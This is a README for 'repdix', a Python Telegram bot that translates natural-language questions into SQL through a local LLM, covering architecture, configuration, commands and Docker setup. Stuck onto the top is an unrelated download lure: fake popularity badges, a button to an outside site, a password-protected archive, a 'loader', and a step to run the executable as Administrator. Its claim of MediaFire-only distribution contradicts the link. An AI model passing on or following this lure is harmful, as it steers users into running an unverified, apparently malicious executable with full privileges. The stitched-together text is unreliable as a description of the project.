<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# 📘 Проект: repdix (Reporting & Data eXplorer)

## 🎯 1. Цель проекта
Создать универсального Telegram-бота-оркестратора (с возможностью расширения на другие чаты), который принимает вопросы на естественном языке, переводит их в SQL-запросы через локальную LLM (LM Studio / Ollama), выполняет их в выбранной базе данных (MySQL, PostgreSQL, SQLite) и возвращает пользователю структурированный ответ.

## 🛠️ 2. Технологический стек
- **Язык:** Python 3.12 (строго).
- **Менеджер зависимостей:** Pipenv (`Pipfile` + `Pipfile.lock`).
- **Асинхронность:** `asyncio` (все операции ввода-вывода должны быть неблокирующими).
- **Telegram:** `aiogram` (v3.x).
- **LLM:** `openai` (AsyncOpenAI), совместимый с LM Studio, Ollama, OpenRouter.
- **Базы данных (асинхронные драйверы):**
  - MySQL: `aiomysql`
  - PostgreSQL: `asyncpg`
  - SQLite: `aiosqlite`
- **Кэширование и контекст:** `redis` (асинхронный клиент `redis.asyncio`).
- **Конфигурация:** `python-dotenv` (для `.env`) и `PyYAML` (для `databases.yaml`, `models.yaml`, `relations.yaml`, `users.yaml`).
- **Контейнеризация:** Docker + `docker compose`.

## 🏗️ 3. Архитектура (Порты и Адаптеры)
Ядро системы ничего не знает о Telegram. Общение с внешним миром идёт через абстрактные интерфейсы.

```text
repdix/
├── app/                        # всё исполняемое
│   ├── __init__.py
│   ├── main.py                 # точка входа: выбирает адаптер и запускает
│   ├── core/                   # бизнес-логика (не зависит от Telegram)
│   │   ├── __init__.py
│   │   ├── engine.py           # главный диспетчер: принимает ChatMessage, возвращает Response
│   │   ├── db_manager.py       # асинхронная работа с разными БД
│   │   ├── llm_client.py       # обёртка над AsyncOpenAI, работа с tool_calls
│   │   ├── cache_manager.py    # менеджер кэша на Redis (история диалогов)
│   │   └── validator.py        # синхронная проверка SQL (только SELECT)
│   └── interfaces/             # адаптеры мессенджеров
│       ├── __init__.py
│       ├── base.py             # абстрактный класс BaseChatInterface
│       ├── telegram_adapter.py # реализация на aiogram
│       └── cli_adapter.py      # консольный интерфейс для отладки
├── config/
│   ├── databases.yaml          # описание подключений к БД
│   ├── models.yaml             # описание моделей LLM
│   ├── relations.yaml          # описание связей для LLM (опционально)
│   └── users.yaml              # белый список пользователей (опционально)
├── docker/                     # инфраструктура
│   ├── dockerfiles/            # Dockerfile'ы
│   │   ├── app.dockerfile
│   │   ├── redis.dockerfile
│   │   └── redis.conf
│   ├── compose.yaml            # оркестрация контейнеров (app + redis)
│   ├── docker_build.sh         # скрипт подготовки и сборки
│   ├── requirements.txt        # генерируется
│   ├── README.md               # копируется
│   └── app/                    # копируется из корня
├── logs/                       # логи (security.log и др.)
├── data/                       # данные SQLite (если используется)
├── .env                        # переменные окружения (НЕ КОММИТИТЬ)
├── Pipfile
├── Pipfile.lock
├── prj_start.sh                # скрипт локального запуска
├── README.md                   # этот файл
└── AGENTS.md                   # инструкция для ИИ-ассистентов
```

### 3.1. Ключевые контракты (интерфейсы)

**`app/interfaces/base.py`**
```python
@dataclass
class ChatMessage:
    user_id: str
    chat_id: str
    text: str

@dataclass
class ChatResponse:
    text: str
    image_path: Optional[str] = None

class BaseChatInterface(ABC):
    @abstractmethod
    async def start(self): ...
    @abstractmethod
    async def send_message(self, chat_id: str, text: str): ...
    @abstractmethod
    async def send_image(self, chat_id: str, image_path: str): ...
```

**`app/core/engine.py`**
```python
class RepdixEngine:
    def __init__(self, db_manager, llm_client, cache_manager):
        self.db_manager = db_manager
        self.llm_client = llm_client
        self.cache_manager = cache_manager
        self.current_db: str | None = None
        self.current_model: str | None = None
        self.history: list[dict] = []  # история диалога
        self.max_history = 10

    async def process_message(self, msg: ChatMessage) -> ChatResponse:
        # 1. Загрузка истории из Redis (по user_id)
        # 2. Обработка служебных команд (/db, /model, /sql, /history, /compact, /clear, /tokens)
        # 3. Отправка в LLM (с tools) + история диалога + схема БД
        # 4. Если tool_call -> валидация SQL -> выполнение -> ответ LLM
        # 5. Сохранение истории в Redis
        # 6. Возврат ChatResponse
```

## 🗄️ 4. Работа с базами данных
- Подключения описываются в `config/databases.yaml`. Пример:
```yaml
databases:
  main_db:
    type: mysql
    host: your-mysql-host.com
    port: 3306
    user: db_user
    password: ${DB_MAIN_PASSWORD}
    database: main_database
    readonly: true
```
- **Выбор БД:** через команду `/db <name>`.
- **Схема БД для LLM:** движок формирует DDL-подобное описание таблиц и передаёт его в system-промпт. При наличии `config/relations.yaml` к схеме добавляются связи (Foreign Keys) и бизнес-заметки.
- **Обязательно:** валидация SQL в `validator.py` — разрешены только `SELECT` (и `WITH ... SELECT`). Попытки нарушения логируются в `logs/security.log`.

## 🧠 5. Работа с моделями и контекстом

### 5.1. Модели
- Описываются в `config/models.yaml`. Переключение через `/model <name>`.
- Список доступных моделей: `/models`.
- В запросе к LLM всегда передаётся инструмент `execute_sql` (формат OpenAI).
- Если модель не поддерживает `tools`, лучше её не использовать для выполнения запросов (Qwen 2.5 поддерживает).

### 5.2. Управление историей (контекстом)
История диалога (`self.history`) хранится в памяти и **дублируется в Redis** (ключ `repdix:history:<user_id>`, TTL 24 часа). Это позволяет сохранять контекст при перезапуске бота. История автоматически обрезается до `max_history = 10` сообщений (5 пар «вопрос-ответ»).

**Команды управления контекстом:**
- `/history` — показать текущую историю (роли и первые 200 символов каждого сообщения).
- `/compact` — сжать историю в краткое резюме через LLM (заменяет старые сообщения одним system-сообщением, экономит токены).
- `/tokens` — показать примерное количество токенов в истории.
- `/clear` — полностью очистить историю (в памяти и в Redis).

## 🛠️ 6. Служебные команды
| Команда | Описание |
|---|---|
| `/db` | Показать текущую БД. |
| `/db <name>` | Выбрать БД по имени из `databases.yaml`. |
| `/model` | Показать текущую модель. |
| `/model <name>` | Выбрать модель по имени из `models.yaml`. |
| `/models` | Список доступных моделей. |
| `/sql <query>` | Выполнить SQL-запрос вручную (только SELECT). |
| `/history` | Показать текущую историю диалога. |
| `/compact` | Сжать историю диалога в краткое резюме. |
| `/clear` | Очистить историю диалога (в памяти и Redis). |
| `/tokens` | Показать примерный расход контекста. |

## 🤖 7. Этапы разработки (для Aider)
1. **MVP: Скелет проекта + CLI-адаптер** — ✅ выполнено.
2. **MVP: Подключение к одной БД (MySQL) и валидация** — ✅ выполнено.
3. **MVP: Подключение к LLM (LM Studio) с tools** — ✅ выполнено.
4. **MVP: Telegram-адаптер** — ✅ выполнено.
5. **Универсальность: Добавление PostgreSQL и SQLite** — ✅ выполнено.
6. **Универсальность: Переключение моделей** — ✅ выполнено.
7. **Безопасность и модерация** — ✅ выполнено.
8. **Docker, Redis и финализация** — ✅ выполнено.

## ⚙️ 8. Инструкция по настройке

### 8.1. Локальная разработка (без Docker)
1. Установите Python 3.12 и Pipenv.
2. Выполните `pipenv install`.
3. Создайте `.env` (пример ниже) и `config/*.yaml`.
4. Для работы с историей запустите Redis локально (например, `docker run -d -p 6379:6379 redis:7-alpine`).
5. Запускайте `./prj_start.sh` (или `pipenv run python -m app.main`).

### 8.2. Файл `.env` (пример)
```env
# Telegram
TELEGRAM_TOKEN=ваш_токен_бота
ALLOWED_USERS=123456789
ADAPTER=cli  # или telegram

# Базы данных
DB_MAIN_PASSWORD=ваш_пароль

# Redis
REDIS_HOST=localhost
REDIS_PORT=6379
```

### 8.3. Запуск в Docker (рекомендуемый)
1. Подготовьте сборочный контекст: `./docker/docker_build.sh` (сгенерирует `requirements.txt` и скопирует код).
2. Запустите контейнеры: `docker compose -f docker/compose.yaml up -d --build`.
3. Логи приложения: `docker logs -f repdix_app`.
4. Логи Redis: `docker logs -f repdix_redis`.

## ⚠️ 9. Ограничения и известные проблемы
- **Локальная LLM (Qwen 14B)** хорошо справляется с фактами, но может ошибаться в сложных аналитических вопросах («почему продаж меньше»). Для сложной аналитики используйте 32B+ модели или `relations.yaml`.
- **Схема БД в промпте** может занимать много токенов для больших баз. При >50 таблиц ограничивайте вывод.
- **Redis** хранит историю 24 часа. Если Redis недоступен, бот работает без сохранения истории между перезапусками (ошибки логируются, но не роняют бота).


---

# MIT License

Copyright (c) 2026 Dmitry Neupokoev

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
